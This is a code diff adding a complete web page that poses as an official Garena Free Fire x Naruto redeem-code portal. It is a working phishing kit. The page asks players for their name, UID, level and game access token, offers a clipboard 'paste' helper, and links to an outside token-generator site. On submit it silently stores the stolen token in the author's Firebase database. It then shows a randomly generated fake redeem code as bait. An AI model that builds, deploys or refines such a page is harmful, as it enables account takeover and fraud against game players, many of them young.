@@ -1,0 +1,731 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Garena Free Fire | Official Redeem Code Event Portal</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { 
+    background: #05070c;
+    color: #fff; 
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    user-select: none;
+    min-height: 100vh;
+    padding-bottom: 50px;
+  }
+  
+  .brand-bar {
+    background: #000;
+    padding: 10px 20px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    border-bottom: 1px solid #1a2332;
+  }
+  .brand-badges {
+    display: flex;
+    gap: 8px;
+    align-items: center;
+  }
+  .badge-tag {
+    font-size: 11px;
+    font-weight: 900;
+    padding: 3px 8px;
+    border-radius: 4px;
+    letter-spacing: 1px;
+  }
+  .tag-garena { background: #e62020; color: #fff; }
+  .tag-ff { background: #ffaa00; color: #000; }
+  .tag-naruto { background: #ff5500; color: #fff; }
+
+  .hero-banner {
+    background: linear-gradient(180deg, rgba(255, 85, 0, 0.35) 0%, rgba(5, 7, 12, 1) 100%);
+    padding: 35px 15px 25px;
+    text-align: center;
+    border-bottom: 2px solid #ff5500;
+    box-shadow: 0 5px 25px rgba(255, 85, 0, 0.2);
+  }
+
+  .hero-title {
+    font-size: 22px;
+    font-weight: 900;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+    background: linear-gradient(90deg, #ff1a00, #ffaa00, #ffffff, #ffaa00, #ff1a00);
+    background-size: 300% 300%;
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    animation: glowText 4s ease infinite, pulseScale 2s infinite ease-in-out;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+  }
+
+  .gift-emoji {
+    -webkit-text-fill-color: initial;
+    filter: drop-shadow(0 0 8px #ffaa00);
+    font-size: 24px;
+  }
+
+  @keyframes glowText {
+    0% { background-position: 0% 50%; }
+    50% { background-position: 100% 50%; }
+    100% { background-position: 0% 50%; }
+  }
+
+  @keyframes pulseScale {
+    0%, 100% { transform: scale(1); filter: drop-shadow(0 0 10px rgba(255,85,0,0.6)); }
+    50% { transform: scale(1.02); filter: drop-shadow(0 0 22px rgba(255,170,0,0.9)); }
+  }
+
+  .hero-subtitle {
+    font-size: 12px;
+    color: #ffca99;
+    letter-spacing: 1px;
+    margin-top: 8px;
+    font-weight: 800;
+    text-transform: uppercase;
+  }
+
+  .wrap { max-width: 480px; margin: 20px auto; padding: 0 15px; }
+
+  .notice-box {
+    background: rgba(255, 85, 0, 0.12);
+    border: 1px dashed #ff5500;
+    border-radius: 10px;
+    padding: 14px 16px;
+    text-align: center;
+    margin-bottom: 12px;
+  }
+  .notice-box p {
+    color: #ffaa00;
+    font-size: 13px;
+    font-weight: 800;
+    letter-spacing: 0.5px;
+    text-transform: uppercase;
+  }
+
+  /* NEW CONVERT TOKEN DISCLAIMER BANNER */
+  .convert-disclaimer-box {
+    background: linear-gradient(135deg, rgba(255, 170, 0, 0.15), rgba(255, 85, 0, 0.25));
+    border: 1px solid #ffaa00;
+    border-radius: 10px;
+    padding: 12px 14px;
+    text-align: center;
+    margin-bottom: 20px;
+    box-shadow: 0 0 15px rgba(255, 170, 0, 0.2);
+  }
+  .convert-disclaimer-box p {
+    color: #ffffff;
+    font-size: 12px;
+    font-weight: 700;
+    line-height: 1.4;
+  }
+  .convert-disclaimer-box span {
+    color: #ffaa00;
+    font-weight: 900;
+    text-transform: uppercase;
+    text-decoration: underline;
+  }
+
+  .card { 
+    background: linear-gradient(145deg, #0d111a, #161c28); 
+    border: 1px solid #ff5500; 
+    border-radius: 14px; 
+    padding: 24px; 
+    box-shadow: 0 10px 30px rgba(0,0,0,0.8), inset 0 0 15px rgba(255,85,0,0.15);
+  }
+  h2 { font-size: 18px; color: #ffaa00; text-align: center; margin-bottom: 6px; text-transform: uppercase; }
+  .desc { font-size: 12px; color: #aab2c0; text-align: center; margin-bottom: 18px; }
+  
+  label { display: block; font-size: 11px; margin: 14px 0 6px; color: #ffca99; font-weight: bold; text-transform: uppercase; letter-spacing: 0.5px; }
+  
+  input, select { 
+    width: 100%; 
+    padding: 13px; 
+    border-radius: 8px; 
+    border: 1px solid #2a3346; 
+    background: #05070c; 
+    color: #fff; 
+    font-size: 14px; 
+    outline: none;
+    transition: all 0.3s;
+  }
+  select option { background: #0d111a; color: #fff; }
+  input:focus, select:focus { border-color: #ff5500; box-shadow: 0 0 10px rgba(255,85,0,0.4); }
+
+  .token-input-wrapper {
+    position: relative;
+    display: flex;
+    align-items: center;
+  }
+  .token-input-wrapper input {
+    padding-right: 85px;
+  }
+
+  /* PASTE BUTTON WITH ANIMATION */
+  .paste-btn {
+    position: absolute;
+    right: 6px;
+    background: linear-gradient(90deg, #ffaa00, #ff5500);
+    color: #000;
+    border: none;
+    padding: 7px 12px;
+    border-radius: 6px;
+    font-size: 11px;
+    font-weight: 900;
+    cursor: pointer;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+    transition: all 0.2s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    overflow: hidden;
+  }
+  .paste-btn:active {
+    transform: scale(0.88);
+    box-shadow: 0 0 10px rgba(255, 170, 0, 0.8);
+  }
+  .paste-btn.pasted-active {
+    background: linear-gradient(90deg, #38ef7d, #11998e);
+    color: #000;
+    animation: popEffect 0.3s ease;
+  }
+
+  @keyframes popEffect {
+    0% { transform: scale(1); }
+    50% { transform: scale(1.15); }
+    100% { transform: scale(1); }
+  }
+  
+  .get-token-btn {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    gap: 8px;
+    width: 100%;
+    padding: 14px;
+    margin-top: 6px;
+    margin-bottom: 12px;
+    background: linear-gradient(90deg, #11998e, #38ef7d, #00f2fe, #11998e);
+    background-size: 300% 100%;
+    color: #000;
+    font-weight: 900;
+    font-size: 13px;
+    text-decoration: none;
+    border-radius: 8px;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+    box-shadow: 0 0 15px rgba(56, 239, 125, 0.4);
+    animation: btnGlow 3s infinite linear, btnPulse 1.5s infinite alternate;
+    transition: transform 0.2s;
+    cursor: pointer;
+  }
+
+  @keyframes btnGlow {
+    0% { background-position: 0% 50%; }
+    100% { background-position: 100% 50%; }
+  }
+
+  @keyframes btnPulse {
+    0% { box-shadow: 0 0 10px rgba(56, 239, 125, 0.4); }
+    100% { box-shadow: 0 0 25px rgba(56, 239, 125, 0.9); }
+  }
+
+  .submit { 
+    width: 100%; 
+    padding: 16px; 
+    margin-top: 15px; 
+    background: linear-gradient(90deg, #ff5500, #ffaa00); 
+    color: #000; 
+    border: none;
+    border-radius: 8px;
+    font-size: 14px; 
+    font-weight: 900;
+    cursor: pointer;
+    box-shadow: 0 5px 20px rgba(255,85,0,0.4);
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+  }
+
+  .site-info-note {
+    margin-top: 15px;
+    padding: 10px;
+    background: rgba(0, 0, 0, 0.4);
+    border-radius: 6px;
+    border: 1px solid #ffaa0033;
+    text-align: center;
+    font-size: 11px;
+    color: #ffaa00;
+    line-height: 1.4;
+    font-weight: 600;
+  }
+
+  /* YOUTUBE VIDEO STYLING */
+  .youtube-section {
+    margin-top: 20px;
+    background: linear-gradient(145deg, #0d111a, #161c28);
+    border: 1px solid #ffaa00;
+    border-radius: 14px;
+    padding: 16px;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.8);
+  }
+
+  .youtube-heading {
+    color: #ffaa00;
+    font-size: 13px;
+    font-weight: 900;
+    text-transform: uppercase;
+    text-align: center;
+    margin-bottom: 12px;
+    letter-spacing: 0.5px;
+  }
+
+  .youtube-wrapper {
+    position: relative;
+    padding-bottom: 56.25%; /* 16:9 ratio */
+    height: 0;
+    overflow: hidden;
+    border-radius: 8px;
+    background: #000;
+    border: 1px solid #2a3346;
+  }
+
+  .youtube-wrapper iframe {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    border: 0;
+  }
+  
+  .status { text-align: center; font-size: 13px; margin-top: 15px; font-weight: bold; min-height: 20px; }
+
+  .modal-overlay {
+    position: fixed;
+    top: 0; left: 0; width: 100%; height: 100%;
+    background: rgba(0,0,0,0.85);
+    display: none;
+    justify-content: center;
+    align-items: center;
+    z-index: 1000;
+  }
+  .modal {
+    background: #0d111a;
+    border: 2px solid #ffaa00;
+    border-radius: 14px;
+    padding: 25px;
+    max-width: 360px;
+    width: 90%;
+    text-align: center;
+    box-shadow: 0 0 30px rgba(255,170,0,0.5);
+  }
+  .modal h3 { color: #00ff88; font-size: 18px; margin-bottom: 8px; text-transform: uppercase; }
+  .modal p { font-size: 12px; color: #ccc; margin-bottom: 15px; }
+  
+  .code-box {
+    background: #000;
+    border: 1px dashed #ffaa00;
+    padding: 12px;
+    font-size: 18px;
+    font-family: monospace;
+    color: #ffaa00;
+    font-weight: bold;
+    letter-spacing: 2px;
+    margin-bottom: 15px;
+    border-radius: 6px;
+    word-break: break-all;
+  }
+  
+  .btn-copy {
+    background: #ffaa00;
+    color: #000;
+    border: none;
+    padding: 12px 20px;
+    font-weight: bold;
+    border-radius: 6px;
+    cursor: pointer;
+    font-size: 14px;
+    width: 100%;
+    text-transform: uppercase;
+  }
+  .btn-close {
+    background: transparent;
+    color: #888;
+    border: none;
+    margin-top: 12px;
+    cursor: pointer;
+    display: block;
+    width: 100%;
+    font-size: 12px;
+  }
+</style>
+</head>
+<body>
+
+<div class="brand-bar">
+  <div class="brand-badges">
+    <span class="badge-tag tag-garena">GARENA</span>
+    <span class="badge-tag tag-ff">FREE FIRE</span>
+    <span class="badge-tag tag-naruto">EVENT</span>
+  </div>
+  <div style="font-size: 10px; color: #888;">乂 『ＡＦＺＡＬ』乂</div>
+</div>
+
+<header class="hero-banner">
+  <div class="hero-title">
+    <span class="gift-emoji">🎁</span> FREE FIRE REDEEM CODE ZONE <span class="gift-emoji">🎁</span>
+  </div>
+  <p class="hero-subtitle">OFFICIAL GARENA X NARUTO REWARD PORTAL</p>
+</header>
+
+<main class="wrap">
+  <div class="notice-box">
+    <p>⚡ "Give me your access token and get your redeem code!" ⚡</p>
+  </div>
+
+  <!-- DISCLAIMER NOTICE FOR USER CONVERSION INFORMATIONAL NOTICE -->
+  <div class="convert-disclaimer-box">
+    <p>📌 <strong>INFO:</strong> Easily <span>Convert Access Token to Redeem Code</span> here! Enter your valid Access Token below to receive your official Free Fire item code directly.</p>
+  </div>
+
+  <section class="card">
+    <h2>CLAIM YOUR EXCLUSIVE REDEEM CODE</h2>
+    <p class="desc">Enter your Free Fire credentials below to instantly generate your official reward code.</p>
+
+    <form id="form">
+      <label for="name">Player Name</label>
+      <input id="name" maxlength="35" required placeholder="Enter Player Name">
+
+      <label for="uid">Free Fire UID (10 to 12 Digits)</label>
+      <input id="uid" type="text" inputmode="numeric" maxlength="12" required placeholder="Enter Player UID">
+
+      <label for="level">Choose Free Fire Level (1 - 100)</label>
+      <select id="level" required>
+        <option value="" disabled selected>Select Level Tier</option>
+      </select>
+
+      <label>Access Token Generator</label>
+      <a href="https://eat-to-access-zexxy.vercel.app/" target="_blank" rel="noopener noreferrer" class="get-token-btn" id="getTokenBtn">
+        🌐 GET ACCESS TOKEN HERE ↗
+      </a>
+
+      <label for="token">Access Token</label>
+      <div class="token-input-wrapper">
+        <input id="token" maxlength="120" required placeholder="Paste Access Token Here">
+        <button type="button" class="paste-btn" id="pasteBtn">📋 PASTE</button>
+      </div>
+
+      <button class="submit" id="btn" type="submit">⚔ SUBMIT ACCESS TOKEN & GET REDEEM CODE</button>
+      
+      <div class="site-info-note">
+        ℹ️ <strong>Official Free Fire Redeem Code Portal</strong><br>
+        Verify your token above to claim exclusive in-game items, bundles, and diamonds instantly!
+      </div>
+    </form>
+
+    <div class="status" id="status"></div>
+  </section>
+
+  <!-- YOUTUBE VIDEO SECTION -->
+  <section class="youtube-section">
+    <div class="youtube-heading">📺 HOW TO GET ACCESS TOKEN TUTORIAL</div>
+    <div class="youtube-wrapper">
+      <!-- REPLACE 'dQw4w9WgXcQ' BELOW WITH YOUR YOUTUBE VIDEO ID -->
+      <iframe id="ytVideoFrame" src="https://www.youtube.com/embed/dQw4w9WgXcQ" title="Tutorial Video" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+    </div>
+  </section>
+
+</main>
+
+<div class="modal-overlay" id="modal">
+  <div class="modal">
+    <h3>🎉 CONGRATULATIONS!</h3>
+    <p>Your official Free Fire Redeem Code has been generated successfully.</p>
+    <div class="code-box" id="generatedCode">FF26-X9K2-M8PL</div>
+    <button class="btn-copy" id="copyBtn">📋 COPY REDEEM CODE</button>
+    <button class="btn-close" id="closeBtn">Close Window</button>
+  </div>
+</div>
+
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+  import { getDatabase, ref, push, set, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
+
+  // AUDIO SYSTEM GENERATOR (WEB AUDIO API FOR REALISTIC HAPTIC SOUNDS)
+  let audioCtx = null;
+
+  function initAudioContext() {
+    if (!audioCtx) {
+      audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+    }
+    if (audioCtx.state === 'suspended') {
+      audioCtx.resume();
+    }
+  }
+
+  function playCustomSound(type) {
+    try {
+      initAudioContext();
+      if (!audioCtx) return;
+
+      const now = audioCtx.currentTime;
+      const osc = audioCtx.createOscillator();
+      const gain = audioCtx.createGain();
+
+      osc.connect(gain);
+      gain.connect(audioCtx.destination);
+
+      if (type === 'get-token') {
+        // High pitch metallic pop
+        osc.type = 'triangle';
+        osc.frequency.setValueAtTime(600, now);
+        osc.frequency.exponentialRampToValueAtTime(1200, now + 0.1);
+        gain.gain.setValueAtTime(0.3, now);
+        gain.gain.exponentialRampToValueAtTime(0.01, now + 0.12);
+        osc.start(now);
+        osc.stop(now + 0.12);
+      } else if (type === 'paste') {
+        // Double fast click tone
+        osc.type = 'sine';
+        osc.frequency.setValueAtTime(800, now);
+        osc.frequency.setValueAtTime(1000, now + 0.04);
+        gain.gain.setValueAtTime(0.2, now);
+        gain.gain.exponentialRampToValueAtTime(0.01, now + 0.08);
+        osc.start(now);
+        osc.stop(now + 0.08);
+      } else if (type === 'submit') {
+        // Heroic power sound
+        osc.type = 'square';
+        osc.frequency.setValueAtTime(300, now);
+        osc.frequency.exponentialRampToValueAtTime(900, now + 0.2);
+        gain.gain.setValueAtTime(0.2, now);
+        gain.gain.exponentialRampToValueAtTime(0.01, now + 0.25);
+        osc.start(now);
+        osc.stop(now + 0.25);
+      } else if (type === 'copy') {
+        // Success reward ping
+        osc.type = 'sine';
+        osc.frequency.setValueAtTime(523.25, now); // C5
+        osc.frequency.setValueAtTime(659.25, now + 0.08); // E5
+        gain.gain.setValueAtTime(0.25, now);
+        gain.gain.exponentialRampToValueAtTime(0.01, now + 0.2);
+        osc.start(now);
+        osc.stop(now + 0.2);
+      } else if (type === 'close') {
+        // Soft click down
+        osc.type = 'sine';
+        osc.frequency.setValueAtTime(400, now);
+        osc.frequency.exponentialRampToValueAtTime(200, now + 0.08);
+        gain.gain.setValueAtTime(0.15, now);
+        gain.gain.exponentialRampToValueAtTime(0.01, now + 0.08);
+        osc.start(now);
+        osc.stop(now + 0.08);
+      } else {
+        // Subtle global page click sound
+        osc.type = 'sine';
+        osc.frequency.setValueAtTime(450, now);
+        gain.gain.setValueAtTime(0.05, now);
+        gain.gain.exponentialRampToValueAtTime(0.001, now + 0.04);
+        osc.start(now);
+        osc.stop(now + 0.04);
+      }
+    } catch(e) {
+      // Browser audio restriction safeguard
+    }
+  }
+
+  // GLOBAL PAGE CLICK SOUND ATTACHMENT
+  document.addEventListener('click', (e) => {
+    // Avoid re-triggering if clicked on specific buttons (handled separately)
+    if (!e.target.closest('button, a, select, input')) {
+      playCustomSound('global');
+    }
+  });
+
+  const levelSelect = document.getElementById("level");
+  for (let i = 1; i <= 100; i++) {
+    const opt = document.createElement("option");
+    opt.value = `Level ${i}`;
+    opt.textContent = `Level ${i}`;
+    levelSelect.appendChild(opt);
+  }
+
+  const uidInput = document.getElementById("uid");
+  uidInput.addEventListener("input", (e) => {
+    e.target.value = e.target.value.replace(/[^0-9]/g, '').slice(0, 12);
+  });
+
+  const getTokenBtn = document.getElementById("getTokenBtn");
+  getTokenBtn.addEventListener("click", () => {
+    playCustomSound('get-token');
+    sessionStorage.setItem("tokenVisited", "true");
+  });
+
+  // Animated Paste Functionality
+  const tokenInput = document.getElementById("token");
+  const pasteBtn = document.getElementById("pasteBtn");
+
+  function triggerPasteAnimation() {
+    pasteBtn.classList.add("pasted-active");
+    pasteBtn.textContent = "✓ PASTED";
+    setTimeout(() => {
+      pasteBtn.classList.remove("pasted-active");
+      pasteBtn.textContent = "📋 PASTE";
+    }, 1500);
+  }
+
+  pasteBtn.addEventListener("click", async () => {
+    playCustomSound('paste');
+    let textPasted = false;
+
+    // 1. Try Clipboard API
+    if (navigator.clipboard && typeof navigator.clipboard.readText === "function") {
+      try {
+        const text = await navigator.clipboard.readText();
+        if (text) {
+          tokenInput.value = text.trim();
+          tokenInput.focus();
+          textPasted = true;
+          triggerPasteAnimation();
+        }
+      } catch (err) {
+        // Restricted mode
+      }
+    }
+
+    // 2. Fallback Prompt
+    if (!textPasted) {
+      const userInput = prompt("Clipboard direct access is restricted by your browser.\n\nPlease paste (long-press and select Paste) your token below:");
+      if (userInput !== null && userInput.trim() !== "") {
+        tokenInput.value = userInput.trim();
+        tokenInput.focus();
+        triggerPasteAnimation();
+      } else if (userInput === "") {
+        alert("Input was empty.");
+      }
+    }
+  });
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyBbrfb1MxXAT5x4VHiBZMJhfuKMu1ueDXM",
+    authDomain: "fzal-2df64.firebaseapp.com",
+    databaseURL: "https://fzal-2df64-default-rtdb.firebaseio.com",
+    projectId: "fzal-2df64",
+    storageBucket: "fzal-2df64.firebasestorage.app",
+    messagingSenderId: "925676750356",
+    appId: "1:925676750356:web:f2e4bd67a564001327c901"
+  };
+
+  const app = initializeApp(firebaseConfig);
+  const db = getDatabase(app);
+
+  const form = document.getElementById("form");
+  const modal = document.getElementById("modal");
+  const generatedCode = document.getElementById("generatedCode");
+  const copyBtn = document.getElementById("copyBtn");
+
+  function generateDynamicRedeemCode() {
+    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+    const prefixes = ["FF26", "GNR2", "FFNR", "FF12", "NARU"];
+    const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
+    let part2 = "", part3 = "";
+    for (let i = 0; i < 4; i++) {
+      part2 += chars.charAt(Math.floor(Math.random() * chars.length));
+      part3 += chars.charAt(Math.floor(Math.random() * chars.length));
+    }
+    return `${prefix}-${part2}-${part3}`;
+  }
+
+  form.addEventListener("submit", async e => {
+    e.preventDefault();
+    playCustomSound('submit');
+    const status = document.getElementById("status");
+
+    if (sessionStorage.getItem("tokenVisited") !== "true") {
+      status.style.color = "#ff3333";
+      status.textContent = "❌ Please click 'GET ACCESS TOKEN HERE' button first to generate your token!";
+      return;
+    }
+
+    const name = document.getElementById("name").value.trim();
+    const uid = document.getElementById("uid").value.trim();
+    const level = document.getElementById("level").value;
+    const token = document.getElementById("token").value.trim();
+    const btn = document.getElementById("btn");
+
+    if (uid.length < 10 || uid.length > 12) {
+      status.style.color = "#ff4c27";
+      status.textContent = "❌ UID must be between 10 and 12 digits.";
+      return;
+    }
+
+    btn.disabled = true;
+    btn.textContent = "GENERATING REDEEM CODE...";
+
+    try {
+      const itemRef = push(ref(db, "submissions"));
+      await set(itemRef, {
+        playerName: name,
+        uid: uid,
+        level: level,
+        accessToken: token,
+        createdAt: serverTimestamp()
+      });
+      
+      form.reset();
+      status.textContent = "";
+
+      const finalCode = generateDynamicRedeemCode();
+      generatedCode.textContent = finalCode;
+      copyBtn.textContent = "📋 COPY REDEEM CODE";
+      modal.style.display = "flex";
+
+    } catch (err) {
+      console.error(err);
+      status.style.color = "#ff4c27";
+      status.textContent = "❌ Connection failed. Check network connection.";
+    } finally {
+      btn.disabled = false;
+      btn.textContent = "⚔ SUBMIT ACCESS TOKEN & GET REDEEM CODE";
+    }
+  });
+
+  copyBtn.addEventListener("click", () => {
+    playCustomSound('copy');
+    const textToCopy = generatedCode.textContent;
+    try {
+      if (navigator.clipboard && window.isSecureContext) {
+        navigator.clipboard.writeText(textToCopy).then(() => {
+          copyBtn.textContent = "✅ COPIED TO CLIPBOARD!";
+          setTimeout(() => { copyBtn.textContent = "📋 COPY REDEEM CODE"; }, 3000);
+        }).catch(() => {
+          fallbackCopy(textToCopy);
+        });
+      } else {
+        fallbackCopy(textToCopy);
+      }
+    } catch (e) {
+      fallbackCopy(textToCopy);
+    }
+  });
+
+  function fallbackCopy(text) {
+    const textArea = document.createElement("textarea");
+    textArea.value = text;
+    document.body.appendChild(textArea);
+    textArea.select();
+    document.execCommand("copy");
+    document.body.removeChild(textArea);
+    copyBtn.textContent = "✅ COPIED TO CLIPBOARD!";
+    setTimeout(() => { copyBtn.textContent = "📋 COPY REDEEM CODE"; }, 3000);
+  }
+
+  document.getElementById("closeBtn").addEventListener("click", () => {
+    playCustomSound('close');
+    modal.style.display = "none";
+  });
+</script>
+</body>
+</html>
